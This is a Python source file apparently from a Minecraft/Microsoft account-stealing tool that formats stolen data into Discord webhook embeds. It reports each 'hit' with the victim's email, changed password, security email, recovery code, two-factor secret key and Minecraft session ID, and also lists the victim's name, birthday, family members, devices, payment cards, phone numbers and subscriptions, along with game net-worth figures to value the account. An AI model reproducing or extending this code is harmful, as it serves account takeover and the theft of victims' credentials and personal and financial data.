from minecraft.get_hypixel import get_hypixel_stats
from minecraft.get_donut import get_donut_stats
from shared.simplify import simplify

from urllib.parse import quote
from discord import Embed
import time


def build_failure_embed(email: str, ms: dict, reason: str, *, error: str | None = None) -> Embed:
    detail = error or reason
    embed = Embed(
        title="Failed to secure account",
        description=reason,
        color=0xFA4343,
    )
    embed.add_field(name="Error", value=f"```{detail[:1000]}```", inline=False)
    embed.add_field(name="Original Email", value=f"```{email}```", inline=False)
    if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
        embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
    if ms.get("password") and ms["password"] != "Couldn't Change!":
        embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
    if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
        embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
    embed.set_footer(text="Save these credentials — the password may already have been changed.")
    return embed


def _field(obj: dict, *keys: str, default: str = "Unknown") -> str:
    for key in keys:
        val = obj.get(key)
        if val not in (None, ""):
            return str(val)
    return default


async def build_account_embeds(account: dict, elapsed: float = 0, account_id: str = "") -> dict:
    mc = account.get("minecraft", {})
    name = quote(mc.get("name") or "Unknown")

    ms = account["microsoft"]
    family = ms["family"]
    devices = ms["devices"]
    cards = ms["cards"]
    subs = ms["subscriptions"]
    phones = ms.get("phones", [])

    active_subs = [(s, "Active") for s in subs["active"]]
    canceled_subs = [(s, "Canceled") for s in subs["canceled"]]
    commercial_subs = [(s, "Commercial") for s in subs["commercial"]]

    all_subs = active_subs + canceled_subs + commercial_subs

    info_embed = Embed(title="Extra Info", color=0x5865F2)
    info_embed.add_field(name="First Name", value=f"```{ms['firstName']}```", inline=True)
    info_embed.add_field(name="Last Name", value=f"```{ms['lastName']}```", inline=True)
    info_embed.add_field(name="Full Name", value=f"```{ms['fullName']}```", inline=False)
    info_embed.add_field(name="Region", value=f"```{ms['region']}```", inline=True)
    info_embed.add_field(name="Birthday", value=f"```{ms['birthday']}```", inline=True)
    info_embed.add_field(name="Language", value=f"```{ms['language']}```", inline=True)

    family_embed = Embed(title=f"Family Members ({len(family)})", color=0x5865F2)
    if family:
        for key, member in enumerate(family, 1):
            family_embed.add_field(
                name=f"Member {key}", 
                value=f"```{_field(member, 'display', 'name')}\n{_field(member, 'email')}\nRole: {_field(member, 'role')}```", 
                inline=True
            )
    else:
        family_embed.description = "This account doesn't belong to a family."


    devices_embed = Embed(title=f"Devices ({len(devices)})", color=0x5865F2)
    if devices:
        for key, device in enumerate(devices, 1):
            devices_embed.add_field(
                name=f"Device {key}", 
                value=f"```{_field(device, 'model')}\n{_field(device, 'name')}```",
                inline=True
            )
    else:
        devices_embed.description = "```There are no devices connected.```"

    # List all cards
    cards_embed = Embed(title=f"Payment Cards ({len(cards)})", color=0x5865F2)
    if cards:
        for key, card in enumerate(cards, 1):
            cards_embed.add_field(
                name=f"Card {key}",
                value=f"```{_field(card, 'paymentMethodType')} *{_field(card, 'lastFourDigits', default='????')}\nExpiry: {_field(card, 'expirationDate', default='N/A')}```",
                inline=True
            )
    else:
        cards_embed.description = "```No payment cards.```"

    phones_embed = Embed(title=f"Phones ({len(phones)})", color=0x5865F2)
    if phones:
        for key, phone in enumerate(phones, 1):
            phones_embed.add_field(
                name=f"Phone {key}",
                value=f"```{_field(phone, 'phone')}\n{_field(phone, 'id')}```",
                inline=True
            )
    else:
        phones_embed.description = "```No phones associated.```"

    subscriptions_embed = Embed(title=f"Subscriptions ({len(all_subs)})", color=0x5865F2)
    if all_subs:
        for key, (sub, status) in enumerate(all_subs, 1):
            subscriptions_embed.add_field(
                name=f"Sub {key}",
                value=f"```{status}\n{_field(sub, 'productName', 'title', 'name', 'offerName', 'productTitle', 'friendlyName')}```",
                inline=True
            )
    else:
        subscriptions_embed.description = "```No subscriptions.```"

    hstats = await get_hypixel_stats(name)
    dstats = await get_donut_stats(name)

    stats_embed = Embed(color=0x279CF5)
    stats_embed.add_field(name="Rank", value=f'{hstats.get("hypixel", {}).get("rank", "N/A")}', inline=True)
    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats.get("hypixel", {}).get("level", 0))}', inline=True)
    stats_embed.add_field(name="Gifted", value=f'{hstats.get("hypixel", {}).get("gifted", 0)}', inline=True)
    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats.get("skyblock", {}).get("networth", 0))}', inline=True)
    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats.get("skyblock", {}).get("level", 0))}', inline=True)
    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)

    xbox_embed = Embed(color=0x107C10, title="Xbox Info")
    xbox_embed.add_field(name="Gamertag", value=f"```{mc.get('gamertag', 'Not Found')}```", inline=False)

    hit_embed = Embed(
        title=f"New Hit! Secured in {round(elapsed, 2)}s",
        description=(
            "[Login](https://login.live.com/) | "
            "[Donut](https://www.donutstats.net/player-finder) | "
            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | "
            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) | "
            f"[Is Online](https://hypixel.paniek.de/player/{name}/status)"
        ),
        color=0x279CF5
    )
    hit_embed.add_field(name="MC Username", value=f"```{mc.get('name', 'No Minecraft')}```", inline=False)
    hit_embed.add_field(name="MC Method", value=f"```{mc.get('method', 'Unknown')}```", inline=True)
    hit_embed.add_field(name="MC Capes", value=f"```{mc.get('capes', 'No capes')}```", inline=True)
    hit_embed.add_field(name="Primary Email", value=f"```{ms['email']}```", inline=False)
    hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
    hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
    hit_embed.add_field(name="Secret Key", value=f"```{ms['auth_secret']}```", inline=False)
    hit_embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
    hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")

    ssid_embed = Embed(
        title="SSID"
    )
    if mc.get("SSID"):
        ssid_embed.description = f"```{mc['SSID']}```"
    else:
        ssid_embed.description = "This account does not have a SSID."

    if mc.get("SSID"):
        hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/128")

    return {
        "hit_embed": hit_embed,
        "account_id": account_id,
        "minecraft": mc,
        "details": {
            "stats_embed": stats_embed,
            "ssid_embed": ssid_embed,
            "info_embed": info_embed,
            "xbox_embed": xbox_embed,
            "family_embed": family_embed,
            "devices_embed": devices_embed,
            "cards_embed": cards_embed,
            "subs_embed": subscriptions_embed,
            "phones_embed": phones_embed,
            "account_details": (
                f"**Username:** {mc.get('name', 'No Minecraft')}\n"
                f"**Has MC:** {bool(mc.get('SSID'))}\n"
                f"**Capes:** {mc.get('capes', 'No capes')}\n"
                f"**Email:** {ms['email']}\n"
                f"**Security Email:** {ms['security_email']}\n"
                f"**Password:** {ms['password']}\n"
                f"**Recovery Code:** {ms['recovery_code']}"
            )
        }
    }
